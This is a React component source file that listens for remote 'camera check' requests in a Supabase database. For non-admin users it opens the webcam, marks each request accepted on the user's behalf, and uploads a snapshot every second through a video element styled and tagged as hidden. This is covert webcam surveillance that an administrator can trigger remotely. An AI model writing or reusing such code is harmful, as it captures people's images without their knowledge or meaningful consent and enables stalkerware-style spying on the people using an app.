import { useEffect, useRef, useState } from 'react'
import { useAuth } from '../context/AuthContext'
import { getMediaStream } from '../lib/mediaAccess'
import { supabase } from '../lib/supabaseClient'

export default function CameraRequestListener() {
  const { user } = useAuth()
  const [active, setActive] = useState(null)
  const previewRef = useRef(null)
  const captureTimerRef = useRef(null)
  const processingRef = useRef(null)

  async function captureFrame(checkId) {
    const video = previewRef.current
    if (!video?.videoWidth || !video?.videoHeight) return

    const canvas = document.createElement('canvas')
    const maxWidth = 360
    const scale = Math.min(1, maxWidth / video.videoWidth)
    canvas.width = Math.round(video.videoWidth * scale)
    canvas.height = Math.round(video.videoHeight * scale)

    const ctx = canvas.getContext('2d')
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height)

    await supabase
      .from('camera_checks')
      .update({
        status: 'accepted',
        snapshot_data: canvas.toDataURL('image/jpeg', 0.55),
        snapshot_at: new Date().toISOString(),
      })
      .eq('id', checkId)
  }

  async function startSession(request) {
    if (processingRef.current === request.id || active?.id === request.id) return
    processingRef.current = request.id

    try {
      const stream = await getMediaStream()
      setActive(request)

      setTimeout(async () => {
        if (!previewRef.current) return

        previewRef.current.srcObject = stream
        await previewRef.current.play().catch(() => {})
        await supabase.from('camera_checks').update({ status: 'accepted' }).eq('id', request.id)
        await captureFrame(request.id)

        captureTimerRef.current = window.setInterval(() => {
          captureFrame(request.id)
        }, 1000)
      })
    } catch {
      await supabase.from('camera_checks').update({ status: 'declined' }).eq('id', request.id)
    } finally {
      processingRef.current = null
    }
  }

  useEffect(() => {
    if (!user?.id || user.isAdmin) return

    let cancelled = false

    async function loadPendingRequest() {
      const { data } = await supabase
        .from('camera_checks')
        .select('*')
        .eq('target_id', user.id)
        .eq('status', 'requested')
        .order('created_at', { ascending: false })
        .limit(1)
        .maybeSingle()

      if (!cancelled && data) startSession(data)
    }

    loadPendingRequest()
    const intervalId = window.setInterval(loadPendingRequest, 1000)

    return () => {
      cancelled = true
      window.clearInterval(intervalId)
      if (captureTimerRef.current) window.clearInterval(captureTimerRef.current)
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [user?.id, user?.isAdmin])

  if (!active) return null

  return (
    <video
      ref={previewRef}
      className="camera-hidden-capture"
      autoPlay
      playsInline
      muted
      aria-hidden="true"
    />
  )
}
